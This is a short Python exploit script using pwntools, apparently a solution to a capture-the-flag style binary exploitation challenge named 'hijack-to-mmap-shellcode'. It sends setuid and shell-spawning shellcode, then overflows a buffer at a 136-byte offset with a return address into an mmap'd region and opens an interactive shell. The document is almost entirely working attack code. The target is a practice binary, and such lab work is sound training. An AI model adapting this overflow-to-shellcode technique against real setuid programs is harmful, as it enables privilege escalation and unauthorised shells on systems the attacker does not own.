#!/usr/bin/python3
from pwn import *
context.arch = "amd64"
context.terminal = context.terminal = ["tmux", "split-window", "-h"]

path = "/challenge/binary-exploitation-hijack-to-mmap-shellcode"

# Debugging to find offset
# p = gdb.debug(path)

# shellcode = asm(shellcraft.setuid())
# shellcode += asm(shellcraft.sh())
# p.sendline(shellcode)

# p.interactive()
# Then find offset via cyclic


# Exploit 
p = process(path)
shellcode = asm(shellcraft.setuid())
shellcode += asm(shellcraft.sh())

p.sendline(shellcode)

offset = 136
payload = b"A" * offset
payload += p64(0x1b632000) # this address is given in the challenge source

# following line to press enter or just send new line
p.sendlineafter(b"Press enter to continue!", b"")

p.sendafter(b"Send your payload (up to 4096 bytes)!", payload)
p.interactive()